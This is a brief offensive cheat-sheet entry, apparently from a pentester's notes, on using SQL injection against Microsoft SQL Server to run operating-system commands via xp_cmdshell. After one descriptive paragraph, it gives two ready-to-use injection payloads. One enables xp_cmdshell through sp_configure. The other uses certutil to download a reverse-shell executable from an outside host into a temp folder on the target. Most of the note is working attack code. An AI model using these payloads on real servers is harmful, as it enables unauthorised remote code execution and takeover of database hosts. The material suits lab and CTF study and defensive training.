#mssqli 
# Executing Commands
**xp_cmdshell** is a system-extended stored procedure in Microsoft SQL Server that enables the execution of operating system commands and programs from within SQL Server. It provides a mechanism for SQL Server to interact directly with the host operating system's command shell. While it can be a powerful administrative tool, it can also be a security risk if not used cautiously when enabled.

```sql
-- Activate xp_cmdshell (Disabled by default since SQL Server 2005)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```
```sql
-- Get Reverse Shell
'; EXEC xp_cmdshell 'certutil -urlcache -f http://10.8.139.254:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --
```
